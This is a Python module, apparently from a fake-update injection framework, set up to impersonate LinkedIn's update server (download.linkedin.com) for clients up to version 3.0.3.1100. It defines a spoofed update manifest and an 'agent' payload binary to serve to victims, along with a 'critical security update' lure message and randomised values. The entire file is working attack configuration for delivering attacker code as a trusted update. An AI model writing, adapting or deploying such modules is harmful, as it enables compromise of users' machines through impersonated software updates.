from modules import ModuleBase


class LinkedIn(ModuleBase):
    name = 'linkedin'
    version = '1.0'
    appver = '<= 3.0.3.1100'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'download.linkedin.com' 
    requests = [
        {   'path': '/web.dat',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': '1',
            'file': './include/linkedin/linkedin_web.dat',
        },
        {   'path': '.bin',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'msg': {
            'val': 'This is a critical security update.',
            'desc': 'Update information, You can use some tag <PRODUCT_NAME>,<NEW_PRODUCT_VERSION>,<BR>-'
        },
        'rand1': {
            'val': 'rand_alpha(rand_num(1))',
            'hidden': 1,
            'dynamic': 1,
        },
        'rand2': {
            'val': 'rand_alpha(rand_num(1))',
            'hidden': 1,
            'dynamic': 1,
        }
    }
